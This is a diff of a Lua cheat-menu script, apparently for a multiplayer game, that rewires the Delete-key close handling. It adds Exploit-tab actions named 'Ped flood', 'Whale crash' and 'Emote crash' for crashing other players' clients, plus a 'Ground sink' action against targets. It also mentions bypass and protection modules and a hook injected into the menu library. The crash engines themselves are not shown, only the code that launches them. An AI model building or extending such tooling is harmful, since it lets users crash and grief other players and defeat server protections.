+    G.abort("panic")
 
     S.suppressOn = false
     S.disableOverlayProbe = false
@@ -27211,23 +28151,33 @@ local function addCategory(category)
 end
 
 -- ---------------------------------------------------------------------------
--- DELETE = HIDE
+-- DELETE = BACK / CLOSE
 --
 -- The library toggles the menu with the key the operator configured in
--- Settings (Menu.SelectedKey); there is no hard-coded M. The operator also
--- wants a one-way "put it away" key that cannot accidentally reopen the menu:
--- physical Delete / Suppr (VK_DELETE = 0x2E). It is read on its own edge, so
--- holding the key does not fight the library toggle, and it is suppressed while
--- the Settings key-capture window is open (otherwise the capture would be
--- impossible). Menu.OpenedCategory is deliberately preserved: reopening with
--- the configured key returns to the same tab, exactly like the library's own
--- close path.
+-- Settings (Menu.SelectedKey); there is no hard-coded M. Physical Delete /
+-- Suppr (VK_DELETE = 0x2E) is a second, independent key:
 --
--- This function only flips Menu.Visible. It deliberately does not call
--- Susano.ResetFrame: the watcher runs on the scheduler thread, while the
--- library owns the render thread and already calls ResetFrame on the next
--- frame when the menu is hidden. Calling a frame API from this thread would be
--- a cross-thread draw call for no benefit.
+--   * inside a category it takes the library's Backspace path: a top-level
+--     autoOpen group first returns to its first tab, any other category goes
+--     back to the main page and resets the cursor;
+--   * on the main page it closes the menu, which is the one action the
+--     library's own Backspace branch cannot reach.
+--
+-- One edge per press: holding the key never repeats. The key is tracked while
+-- the menu is closed, so opening the menu while Delete is already held does
+-- not immediately close what the operator just opened. The key is ignored
+-- while a key/bind/input capture is open, and while Delete itself is the menu
+-- toggle.
+--
+-- Two callers, one function: the injected HandleInput hook in loader.lua calls
+-- it on the library's own frame loop (frame-accurate, catches a fast tap that
+-- a 40 ms poll can miss), and the scheduler keeps it on O.every as a fallback
+-- if the remote library ever loses the marker. Returning true means "acted";
+-- the hook then skips the rest of HandleInput for that frame.
+--
+-- It never calls Susano.ResetFrame: the hook runs on the library's render
+-- thread (which calls ResetFrame on the next hidden frame), and the scheduler
+-- must not make a cross-thread draw call for no benefit.
 -- ---------------------------------------------------------------------------
 local function hideMenu()
     if type(Menu) ~= "table" or Menu.Visible ~= true then return false end
@@ -27237,38 +28187,59 @@ end
 
 local deleteHeld = false
 
-local function watchDelete()
+local function deleteTick()
+    if type(Menu) ~= "table" then return false end
     if type(Susano) ~= "table" or type(Susano.GetAsyncKeyState) ~= "function" then
-        return
+        return false
     end
 
     local ok, down, pressed = pcall(Susano.GetAsyncKeyState, 0x2E)
-    if not ok then return end
+    if not ok then return false end
     down = down == true or down == 1
     pressed = pressed == true or pressed == 1
 
-    -- Track the physical edge even while the menu is closed. If Delete is
-    -- already held when the menu opens, the first tick must not immediately
-    -- close what the operator just opened.
+    -- The physical edge is tracked even while the menu is closed. If Delete is
+    -- already held when the menu opens, the first tick must not act on it.
     local edge = pressed or (down and not deleteHeld)
     deleteHeld = down
 
-    if not edge then return end
-    if Menu.SelectingKey or Menu.SelectingBind or Menu.InputOpen then return end
+    if not edge then return false end
+    if Menu.Visible ~= true then return false end
+    if Menu.SelectingKey or Menu.SelectingBind or Menu.InputOpen then return false end
+    if Menu.SelectedKey == 0x2E then return false end
 
-    -- If the operator rebinds the menu toggle to Delete, that key belongs to
-    -- the library. A second close-only binding on the same key would make the
-    -- menu impossible to open.
-    if Menu.SelectedKey == 0x2E then return end
+    -- Main page: close. This is the action the operator asked for and the one
+    -- the library's Backspace path cannot produce.
+    if Menu.OpenedCategory == nil then
+        return hideMenu()
+    end
 
-    hideMenu()
+    -- Inside a category: the same navigation the library applies to Backspace.
+    local top = Menu.TopLevelTabs and Menu.TopLevelTabs[Menu.CurrentTopTab]
+    if top and top.autoOpen then
+        if Menu.CurrentTopTab > 1 then
+            Menu.CurrentTopTab = 1
+            if type(Menu.UpdateCategoriesFromTopTab) == "function" then
+                Menu.UpdateCategoriesFromTopTab()
+            end
+        else
+            Menu.Visible = false
+        end
+    else
+        Menu.OpenedCategory = nil
+        Menu.CurrentItem = 1
+        Menu.CurrentTab = 1
+        Menu.ItemScrollOffset = 0
+    end
+    return true
 end
 
 -- Internal test seams. They are not menu rows and are not exposed in any
 -- category; keeping them on Menu lets the offline harness drive the same
--- function the scheduler uses, without copying the body into the test.
+-- functions the injected hook and the scheduler use.
 Menu.__vgd_hide = hideMenu
-Menu.__vgd_watchDelete = watchDelete
+Menu.__vgdDeleteTick = deleteTick
+Menu.__vgd_watchDelete = deleteTick
 
 -- ---------------------------------------------------------------------------
 -- EXPLOIT > BYPASS
@@ -28076,21 +29047,23 @@ local function installProtection()
 end
 
 -- ---------------------------------------------------------------------------
--- EXPLOIT > EXPLOIT (CRASH ACTION)
+-- EXPLOIT > EXPLOIT (THREE CRASH ACTIONS)
 --
--- One action: click `Clip swarm` and it starts. There is no separate selector,
--- no Crash button, no target/intensity/stop row. The tab lives inside Exploit
--- instead of a top-level category: fewer top-level rows, and the crash action
--- sits next to the other exploit actions. Any stale top-level Crasher category
--- from an older loader is removed on every load.
--- The tab itself is named "Exploit"; "Crasher" is only the historical module
--- name and the old tab label that is merged into it.
+-- Three independent actions: `Ped flood`, `Whale crash`, `Emote crash`.
+-- There is no shared Method selector, no Intensity slider, no target row and
+-- no Launch/Stop row. One click selects one engine, one target window and one
+-- wire signature. The tab lives inside Exploit instead of a top-level category:
+-- fewer top-level rows, and the crash actions sit next to the other exploit
+-- actions. Any stale top-level Crasher category from an older loader is removed
+-- on every load. The tab itself is named "Exploit"; "Crasher" is only the
+-- historical module name and the old tab label that is merged into it.
 -- ---------------------------------------------------------------------------
 local CRASH_ROWS = {
     "Method", "Crash", "Intensity", "Target: nearest", "Launch crash",
     "Stop + clean", "Probe channels", "Objects (orbit)",
     "Anim churn", "Synced scenes", "Ped variation", "Objects (flood)",
     "PTFX storm", "Clip swarm",
+    "Ped flood", "Whale crash", "Emote crash",
 }
 
 -- The current labels are part of the sweep as well. Without them, every
@@ -28140,15 +29113,13 @@ local function installCrasher()
         end
     end
 
-    -- One exposed method, Heavy by default. The dump shows the store already
-    -- at 19807/21000; the scene hold is the part that lets every client
-    -- stream the dictionaries before the release. The engine exposes the
-    -- method as "Ped flood"; the menu labels it "Clip swarm" because the
-    -- visible result is the streamed crowd, not a model-name list.
+    -- Three direct actions. Each one calls C.launch(kind); the engine owns the
+    -- target window, spawn/task path and cleanup. Nothing is shared between
+    -- the three vectors, so a click never runs a mixed object/ped/emote loop.
     --
     -- Prepend the crash block instead of appending it. The base Exploits tab
     -- also carries the server rows (Staff Mode, Disable Weapon Damage, Menu
-    -- Staff, Revive); with ItemsPerPage = 8, the single crash row and its
+    -- Staff, Revive); with ItemsPerPage = 8, the three crash rows and their
     -- separator stay on the first page and the server rows remain available
     -- underneath.
     local crashItems = {
@@ -28158,12 +29129,24 @@ local function installCrasher()
             separatorText = "Crash",
         },
         {
-            name = "Clip swarm",
+            name = "Ped flood",
             type = "action",
             onClick = function()
-                C.setMethod(1)
-                C.setIntensity(3)
-                C.launch()
+                C.launch("ped")
+            end,
+        },
+        {
+            name = "Whale crash",
+            type = "action",
+            onClick = function()
+                C.launch("whale")
+            end,
+        },
+        {
+            name = "Emote crash",
+            type = "action",
+            onClick = function()
+                C.launch("emote")
             end,
         },
     }
@@ -28219,6 +29202,64 @@ end
 -- row, calls this installer again, and verifies the selection survives the
 -- prepend. It is not a menu row.
 Menu.__vgd_installCrasher = installCrasher
+
+-- ---------------------------------------------------------------------------
+-- EXPLOIT > GROUND
+--
+-- One action, no preset selector: G picks sink or slam from the target's
+-- state. The rows sit right under the crash block so the whole physical
+-- surface of the tab is on the first page, and the installer is idempotent
+-- like the crasher (removes its own separator/action before inserting).
+-- ---------------------------------------------------------------------------
+local function installSink()
+    local tab = collapseExploitTab()
+    if not tab then return false end
+
+    for i = #tab.items, 1, -1 do
+        local item = tab.items[i]
+        if item.name == "Ground sink"
+            or (item.isSeparator and item.separatorText == "Ground") then
+            table.remove(tab.items, i)
+        end
+    end
+
+    -- Anchor after the LAST crash row when the block is present, so Ground
+    -- stays below all three crashers instead of splitting the block. If the
+    -- crasher was not installed in this build, the block goes to the top.
+    local at = 0
+    for i = 1, #tab.items do
+        local name = tab.items[i].name
+        if name == "Clip swarm" or name == "Ped flood"
+            or name == "Whale crash" or name == "Emote crash" then
+            at = i
+        end
+    end
+
+    local selected = (type(Menu.CurrentItem) == "number") and tab.items[Menu.CurrentItem] or nil
+
+    table.insert(tab.items, at + 1, {
+        name = "",
+        isSeparator = true,
+        separatorText = "Ground",
+    })
+    table.insert(tab.items, at + 2, {
+        name = "Ground sink",
+        type = "action",
+        onClick = function() G.start() end,
+    })
+
+    if selected then
+        for i = 1, #tab.items do
+            if tab.items[i] == selected then
+                Menu.CurrentItem = i
+                break
+            end
+        end
+    end
+    return true
+end
+
+Menu.__vgd_installSink = installSink
 
 -- ---------------------------------------------------------------------------
 -- VEHICLE > SPOOFED
@@ -29479,6 +30520,7 @@ local function build()
     installSettingsDefaults()
     installProtection()
     installCrasher()
+    installSink()
     installVehicleSpoof()
     installRampFix()
     reorderPlayerTabs()
@@ -29506,11 +30548,13 @@ end
 function UI.boot()
     O.thread()
 
-    -- Delete is a one-way close. 40 ms is faster than a frame at 30 FPS and
-    -- cheap enough for a single GetAsyncKeyState call. Register it before
-    -- A.boot() so a protection arm error cannot leave the menu without its
-    -- close key.
-    O.every("menuHide", 40, watchDelete, 0)
+    -- Delete fallback poll. 40 ms is faster than a frame at 30 FPS and cheap
+    -- enough for a single GetAsyncKeyState call. The frame-accurate caller is
+    -- the hook loader.lua injects into Menu.HandleInput; this one keeps the
+    -- key working if the remote library ever loses that marker. Register it
+    -- before A.boot() so a protection arm error cannot leave the menu without
+    -- its close key.
+    O.every("menuHide", 40, Menu.__vgdDeleteTick, 0)
 
     A.boot()
 
@@ -29561,7 +30605,7 @@ UI.boot()
 return UI
 
 
-end)(O,S,E,D,F,V,M,SN,C,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
+end)(O,S,E,D,F,V,M,SN,C,G,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
 
 
 end)()
